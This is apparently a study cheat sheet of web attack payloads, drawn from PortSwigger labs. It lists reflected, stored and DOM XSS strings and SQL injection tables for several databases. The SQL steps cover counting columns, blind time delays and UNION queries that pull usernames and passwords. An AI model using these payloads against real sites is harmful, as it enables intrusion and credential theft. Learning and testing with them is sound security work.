# **<a name="webapp">Web Application table of Contents</a>**
* [XSS](#xss)
* [SQLi](#SQLi)




# **<a name="xss">XSS</a>**

## Reflected 
`GET /?search=<script>alert(1)</script> HTTP/1.1`

### escape script and backslash

`</script><img src=1 onerror=alert(document.domain)>`  
`</script><script>alert(1)</script>`

### Brak out of javascript string

`'-alert(document.domain)-'`  
`'+alert(document.domain)+'`  
`';alert(document.domain)//`  
`http://foo?&apos;-alert(1)-&apos;`  
`${alert(document.domain)}`  
`javascript:"/*'/*'/*--><html \" onmouseover=/*&lt;svg/*/onload=alert()//>`  

## Stored

Enter the following into the comment box

`<script>alert(1)</script>`  
`"onmouseover="alert(1)`

Inserted in GET/POST request

`<a id="author" href="javascript:alert(document.domain)">test</a>`

## DOM XSS

If you search 5333 in search bar

in javascript function calls 

    function trackSearch(query) 
    {document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');}
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query){trackSearch(query);}  
    <img src="/resources/images/tracker.gif?searchTerms=5333">
                                          
search for 

` "><svg onload=alert(1)>`

this will break out new paramiter in javascript

     <img src="/resources/images/tracker.gif?searchTerms=">
     <svg onload="alert(1)">"&gt;
     <section class="blog-list">
     </section></svg>


### Sinks

https://brutelogic.com.br/blog/dom-based-xss-the-3-sinks/

Document sink
 
`name=<img+src+onerror=alert(1)>`
 
Location sink
 
`redir=javascript:alert(1)`  
`&storeId="></select><img+src%3d1+onerror%3dalert(1)>`
 
Execution sink eval call error
  
  `index=alert(1)`
  
  angular js sink
  
  `{{$on.constructor('alert(1)')()}}`
 
 
# **<a name="SQLi">SQLi</a>**

`xyz' OR 1=1--`


### Cheatsheats

|Title    | Concat  |  
| --------- | ------------- |
|Oracle | `'foo' \|\| 'bar'` |  
|Microsoft | `'foo'+'bar'` |  
|PostgreSQL | `'foo' \|\| 'bar'` |
|MySQL | `foo' 'bar'` or `CONCAT('foo','bar')` |  

|Title    | Comments |  
| --------- | ------------- |
|Oracle | `--comment` |  
|Microsoft | `--comment` or `/*comment*/` |  
|PostgreSQL | `--comment` or `/*comment*/` |
|MySQL | `-- comment` has to have space or `/*comment*/` or `#comment`|  

|Title    | Database Version |  
| --------- | ------------- |
|Oracle | `SELECT banner FROM v$version` |
|Oracle | `SELECT version FROM v$instance` |
|Microsoft | `SELECT @@version` |  
|PostgreSQL | `SELECT version()` |
|MySQL | `SELECT @@version` |

|Title    | Database Contents |  
| --------- | ------------- |
|Oracle | `SELECT * FROM all_tables` |
|Oracle | `SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'` |
|Microsoft | `SELECT * FROM information_schema.tables` |  
|Microsoft | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` | 
|PostgreSQL | `SELECT * FROM information_schema.tables` |
|PostgreSQL | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
|MySQL | `SELECT * FROM information_schema.tables` |
|MySQL | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |

|Title    | Conditional Errors |  
| --------- | ------------- |
|Oracle | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual` |
|Microsoft | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END` |  
|PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END` |
|MySQL | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |

|Title    | Stacked Queries |  
| --------- | ------------- |
|Oracle | Does not support |
|Microsoft | `QUERY-1-HERE; QUERY-2-HERE` |  
|PostgreSQL | `QUERY-1-HERE; QUERY-2-HERE` |
|MySQL | Does not support |

|Title    | Time Delays |  
| --------- | ------------- |
|Oracle | `dbms_pipe.receive_message(('a'),10)` |
|Microsoft | `WAITFOR DELAY '0:0:10'` |  
|PostgreSQL | `SELECT pg_sleep(10)` |
|MySQL | `SELECT sleep(10)` |


|Title    | Conditional Time Delays |  
| --------- | ------------- |
|Oracle | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
|Microsoft | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'` |  
|PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
|MySQL | `SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')` |

## Union


Injection

`xyz' UNION SELECT 'a' WHERE 1=1--`  
`xyz' UNION SELECT 'a' WHERE 1=2--`

Finding column lenghts

`' UNION SELECT NULL--`  
`' UNION SELECT NULL,NULL--`  
`' UNION SELECT NULL,NULL,NULL--`  

or  

`' ORDER BY 1--`  
`' ORDER BY 2--`  
`' ORDER BY 3--`  

Finding injectable fields  

`GET /filter?category=Accessories'+UNION+SELECT+NULL,'Injectable',NULL--+ HTTP/1.1`  
`' UNION SELECT 'a',NULL,NULL,NULL--`  
`' UNION SELECT NULL,'a',NULL,NULL--`  
`' UNION SELECT NULL,NULL,'a',NULL--`  
`' UNION SELECT NULL,NULL,NULL,'a'--`  

Retreiving Data

`GET /filter?category=Gifts'+UNION+SELECT+username,+password+FROM+users-- HTTP/1.1`

Concat

`GET /filter?category=Pets'+UNION+SELECT+NULL,username+||+'~'+||+password+FROM+users--+ HTTP/1.1`

|Title    | concat method |  
| --------- | ------------- |
|Oracle | `'foo' \|\| 'bar'` |  
|Microsoft | `'foo'+'bar'` |  
|PostgreSQL | `'foo' \|\| 'bar'` |
|MySQL | `foo' 'bar'` or `CONCAT('foo','bar')` |  

### Enumeration

























Referances:

https://portswigger.net/web-security
